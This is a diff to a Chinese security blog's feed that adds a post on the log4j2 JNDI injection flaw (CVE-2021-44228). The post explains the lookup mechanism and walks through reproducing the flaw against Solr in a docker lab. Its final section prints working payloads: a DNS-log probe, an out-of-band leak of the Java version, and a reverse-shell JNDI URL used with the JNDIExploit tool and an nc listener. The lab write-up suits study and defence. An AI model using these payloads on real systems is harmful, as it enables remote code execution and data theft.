@@ -3,7 +3,113 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝 • Posts by &#34;漏洞&#34; category</title>
     <link href="https://my011215.github.io" />
-    <updated>2023-02-14T06:12:30.000Z</updated>
+    <updated>2023-10-29T03:12:30.000Z</updated>
+    <entry>
+        <id>https://my011215.github.io/2023/10/29/Penetration%20testing/log4j2%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90+%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</id>
+        <title>log4j2原理分析+漏洞复现和利用</title>
+        <link rel="alternate" href="https://my011215.github.io/2023/10/29/Penetration%20testing/log4j2%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90+%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/"/>
+        <content type="html">&lt;!-- toc --&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#log4j2%E7%AE%80%E4%BB%8B&#34;&gt;log4j2 简介&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0&#34;&gt;漏洞描述&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC&#34;&gt;漏洞适用版本&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&#34;&gt;漏洞原理&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#log4j&#34;&gt;log4j&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#lookup&#34;&gt;lookup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#jndi%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;jndi 解析器&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#ldap%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;LDAP 解析器&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#dns%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;DNS 解析器&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#rmi%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;RMI 解析器&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#jdbc%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;JDBC 解析器&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#jms%E8%A7%A3%E6%9E%90%E5%99%A8&#34;&gt;JMS 解析器&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B&#34;&gt;攻击过程&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8&#34;&gt;漏洞复现和利用&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- tocstop --&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
+&lt;h2&gt;&lt;span id=&#34;log4j2-简介&#34;&gt; log4j2 简介&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;log4j2 是 Java 平台上一种流行的日志管理框架，也是 log4j 的升级版本。它提供了高度灵活和可配置的日志记录功能，可以用于在应用程序中生成、管理和输出日志信息。&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞描述&#34;&gt; 漏洞描述&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;Apache Log4j 是 Apache 的一个开源项目，Apache log4j2 是 Log4j 的升级版本，用户可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。&lt;/p&gt;
+&lt;p&gt;Log4j2 中存在 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。该漏洞影响 Apache Struts、Apache Solr、Apache Druid、Apache Filnk 等众多组件，漏洞影响面大，危害性高。&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞适用版本&#34;&gt; 漏洞适用版本&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;2.0 &amp;lt;= Apache log4j2 &amp;lt;= 2.14.1&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞原理&#34;&gt; 漏洞原理&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;Apache log4j2-RCE 漏洞是由于 Log4j2 提供的 lookup 功能下的 Jndi Lookup 模块出现问题所导致的，这个模块在进行日志输出的时候可以通过对应的协议去访问服务器资源，但是对请求的数据内容又没有进行严格过滤，最终导致 Log4j2 去请求有恶意代码的服务器资源，从而造成远程代码执行导致命令执行。&lt;/p&gt;
+&lt;h3&gt;&lt;span id=&#34;log4j&#34;&gt; log4j&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;一款通用的日志记录工具，可以通过简单表达式记录内容。&lt;br&gt;
+这里的例子使用的是 sys 解析器（sys:user.dir）&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;logger.info(&amp;quot;system propety: $&amp;#123;sys:user.dir&amp;#125;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4&gt;&lt;span id=&#34;lookup&#34;&gt; lookup&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;Lookup 是一种机制，用于动态获取和替换日志记录中的变量或属性的值。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;date&amp;#125;：获取当前日期和时间，支持自定义格式。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;pid&amp;#125;：获取当前进程的 ID。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;logLevel&amp;#125;：获取当前日志记录的级别。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4&gt;&lt;span id=&#34;jndi-解析器&#34;&gt; jndi 解析器&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;JNDI（Java Naming and Directory Interface）是 Java 提供的一种标准的 API，用于访问命名和目录服务，例如 DNS、LDAP 等。JNDI 提供了一种统一的方式来查找和访问各种命名服务，使得 Java 应用程序可以方便地与这些服务进行交互。&lt;/p&gt;
+&lt;p&gt;在 JNDI 中，解析器（Resolver）是一个关键的组件。解析器用于将给定的名称解析为其对应的目标对象。JNDI 提供了多种类型的解析器，根据不同的命名服务类型选择不同的解析器进行使用。&lt;br&gt;
+常见的 JNDI 解析器包括：&lt;/p&gt;
+&lt;h5&gt;&lt;span id=&#34;ldap-解析器&#34;&gt; LDAP 解析器&lt;/span&gt;&lt;/h5&gt;
+&lt;p&gt;用于解析 LDAP（轻量级目录访问协议）服务中的名称，将名称映射到目标对象，例如用户、组织等。&lt;/p&gt;
+&lt;h5&gt;&lt;span id=&#34;dns-解析器&#34;&gt; DNS 解析器&lt;/span&gt;&lt;/h5&gt;
+&lt;p&gt;用于解析 DNS（域名系统）服务中的名称，将主机名解析为其对应的 IP 地址。&lt;/p&gt;
+&lt;h5&gt;&lt;span id=&#34;rmi-解析器&#34;&gt; RMI 解析器&lt;/span&gt;&lt;/h5&gt;
+&lt;p&gt;用于解析 RMI（远程方法调用）服务中的名称，将名称映射到远程对象。&lt;/p&gt;
+&lt;h5&gt;&lt;span id=&#34;jdbc-解析器&#34;&gt; JDBC 解析器&lt;/span&gt;&lt;/h5&gt;
+&lt;p&gt;用于解析 JDBC（Java 数据库连接）服务中的数据源名称，将数据源名称解析为其对应的数据库连接。&lt;/p&gt;
+&lt;h5&gt;&lt;span id=&#34;jms-解析器&#34;&gt; JMS 解析器&lt;/span&gt;&lt;/h5&gt;
+&lt;p&gt;用于解析 JMS（Java 消息服务）服务中的队列名称或主题名称，将名称解析为其对应的消息队列或主题。&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;攻击过程&#34;&gt; 攻击过程&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;攻击一般使用 ldap、rmi 进行注入，大致过程一般如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;发送请求语句&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;jndi://rmi:服务器地址/Exploit&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;jndi:ldap:192.168.96.1:1099/exp&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;解析语句内容后对服务器资源发起请求。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;请求到资源后，下载 class 恶意文件并且执行代码，最终造成命令执行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;&lt;span id=&#34;漏洞复现和利用&#34;&gt; 漏洞复现和利用&lt;/span&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞环境&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /log4j/CVE-2021-44228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ocker-compose up -d &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/437.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;检测漏洞&lt;br&gt;
+使用 ldap 解析器，配合 doslog 回显平台，查看测试情况。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://x.x.x.x:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://baec1688.dns.whitehat.asia.&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/438.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/439.png?raw=true&#34; alt&gt;&lt;br&gt;
+可以显而易见看到存在漏洞，并且有回显数据。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;带外回显数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://x.x.x.x:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://$&amp;#123;sys:java.version&amp;#125;.baec1688.dns.whitehat.asia.&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/440.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;反弹 shell&lt;br&gt;
+ 工具地址：&lt;a href=&#34;https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4&#34;&gt;https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://目标机IP:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://x.x.x.x:1389/Basic/ReverseShell/x.x.x.x/6666&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDIExploit-1.4-SNAPSHOT.jar -i x.x.x.x&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/441.png?raw=true&#34; alt&gt;&lt;/p&gt;
+</content>
+        <updated>2023-10-29T03:12:30.000Z</updated>
+    </entry>
     <entry>
         <id>https://my011215.github.io/2023/02/14/vulnerability/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</id>
         <title>文件下载漏洞</title>
